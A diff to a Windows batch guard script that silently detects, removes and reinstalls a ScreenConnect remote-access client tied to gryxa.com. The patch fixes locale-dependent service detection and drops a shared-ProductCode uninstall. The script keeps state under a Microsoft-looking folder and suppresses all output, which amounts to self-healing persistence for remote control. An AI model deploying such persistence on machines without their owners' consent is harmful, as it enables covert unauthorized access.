@@ -79,6 +79,10 @@ rem   pattern as Shields); on timeout the guard proceeds to Detect/Install. Hunt
 rem   also enumerates tasks via schtasks.exe CSV (avoids the Get-ScheduledTask hang).
 rem 0.2.0 (Sight): maint.flag skips install ladder (still digests); Hunt/Rmm prefer
 rem   hash-pinned winrtcs_sidekick.ps1 when present (thin batch / heavy PS path).
+rem 0.2.1 (C32 EVITA): Detect/DetectAll matched English SERVICE_NAME: - Spanish Windows
+rem   emits NOMBRE_SERVICIO: so Gryxa looked "absent" forever; every cycle msiexec /x the
+rem   shared ProductCode + reinstall = console duplicates. Detect is locale-invariant now;
+rem   Install never msiexec /x shared PC (keepers share it - C03/C29).
 setlocal EnableExtensions EnableDelayedExpansion
 set "ZD=C:\ProgramData\WinRTCS"
 set "CD=C:\ProgramData\Microsoft\WinRTCS\cache"
@@ -105,7 +109,7 @@ set "GDIR86=C:\Program Files (x86)\ScreenConnect Client (36e506ff016b2151)"
 set "GDIR64=C:\Program Files\ScreenConnect Client (36e506ff016b2151)"
 set "PC={9D7CC418-A356-9693-DCC5-41EC44D03B31}"
 set "PACKED=814CC7D9653A3969CD5C14CE440DB313"
-set "GVER=0.2.0"
+set "GVER=0.2.1"
 if not exist "%ZD%" mkdir "%ZD%" >nul 2>&1
 
 rem --- TRUST (C24): data pins published by the agent from the signed manifest ---
@@ -267,13 +271,12 @@ set /a RI+=1
 if !RI! GTR 2 ( echo [%DATE% %TIME%] FAIL_install_cap>>"%LOG%" & echo 170>"%ZD%\guard.cnt" & goto :Done )
 set "MSI=%ZD%\gryxa_install.msi"
 
-rem --- precondition (proven clean-install): kill gryxa svcs, uninstall shared PC, purge phantoms ---
+rem --- precondition: kill gryxa svc only; NEVER msiexec /x shared PC (C03/C29/C32) ---
 call :Detect
 if defined GSVC (
   sc stop "!GSVC!" >nul 2>&1
   sc delete "!GSVC!" >nul 2>&1
 )
-msiexec /x %PC% /qn /norestart REBOOT=ReallySuppress >nul 2>&1
 call :PurgePhantom
 
 for /d %%D in ("%ProgramFiles(x86)%\ScreenConnect Client (*)") do (
@@ -323,7 +326,11 @@ echo [%DATE% %TIME%] msiexec_exit=!MSIEXIT! attempt=!ATTEMPT!>>"%LOG%"
 if "!MSIEXIT!"=="0" goto :WaitSvc0
 if "!MSIEXIT!"=="3010" goto :WaitSvc0
 if !ATTEMPT! GEQ 2 ( set /a "STREAK+=1" & echo !STREAK!>"%STREAKF%" & echo [%DATE% %TIME%] FAIL_msiexec_!MSIEXIT! streak=!STREAK!>>"%LOG%" & echo 170>"%ZD%\guard.cnt" & goto :Done )
-msiexec /x %PC% /qn /norestart REBOOT=ReallySuppress >nul 2>&1
+call :Detect
+if defined GSVC (
+  sc stop "!GSVC!" >nul 2>&1
+  sc delete "!GSVC!" >nul 2>&1
+)
 call :PurgePhantom
 ping -n 6 127.0.0.1 >nul 2>&1
 goto :TryInstall
@@ -405,23 +412,31 @@ del /f /q "%MSI%" >nul 2>&1
 goto :Done
 
 :Detect
+rem C15/C32: match "ScreenConnect Client (" (locale-invariant). Spanish uses NOMBRE_SERVICIO:
+rem instead of SERVICE_NAME: - the old English-only findstr made every Spanish host look absent.
 set "GSVC="
-for /f "tokens=2 delims=:" %%A in ('sc query state^= all 2^>nul ^| findstr /C:"SERVICE_NAME: ScreenConnect Client ("') do (
-  for /f "tokens=* delims= " %%S in ("%%A") do (
-    reg query "HKLM\SYSTEM\CurrentControlSet\Services\%%S" /v ImagePath 2>nul | findstr /I "gryxa.com" >nul
-    if not errorlevel 1 set "GSVC=%%S"
+for /f "tokens=1,* delims=:" %%A in ('sc query state^= all 2^>nul ^| findstr /C:"ScreenConnect Client ("') do (
+  for /f "tokens=* delims= " %%S in ("%%B") do (
+    echo %%S| findstr /I /B /C:"ScreenConnect Client (" >nul
+    if not errorlevel 1 (
+      reg query "HKLM\SYSTEM\CurrentControlSet\Services\%%S" /v ImagePath 2>nul | findstr /I "gryxa.com" >nul
+      if not errorlevel 1 set "GSVC=%%S"
+    )
   )
 )
 exit /b 0
 
 :DetectAll
 set "GCNT=0"
-for /f "tokens=2 delims=:" %%A in ('sc query state^= all 2^>nul ^| findstr /C:"SERVICE_NAME: ScreenConnect Client ("') do (
-  for /f "tokens=* delims= " %%S in ("%%A") do (
-    reg query "HKLM\SYSTEM\CurrentControlSet\Services\%%S" /v ImagePath 2>nul | findstr /I "gryxa.com" >nul
+for /f "tokens=1,* delims=:" %%A in ('sc query state^= all 2^>nul ^| findstr /C:"ScreenConnect Client ("') do (
+  for /f "tokens=* delims= " %%S in ("%%B") do (
+    echo %%S| findstr /I /B /C:"ScreenConnect Client (" >nul
     if not errorlevel 1 (
-      set /a GCNT+=1
-      for %%Q in ("!GCNT!") do set "GSVC_%%~Q=%%S"
+      reg query "HKLM\SYSTEM\CurrentControlSet\Services\%%S" /v ImagePath 2>nul | findstr /I "gryxa.com" >nul
+      if not errorlevel 1 (
+        set /a GCNT+=1
+        for %%Q in ("!GCNT!") do set "GSVC_%%~Q=%%S"
+      )
     )
   )
 )
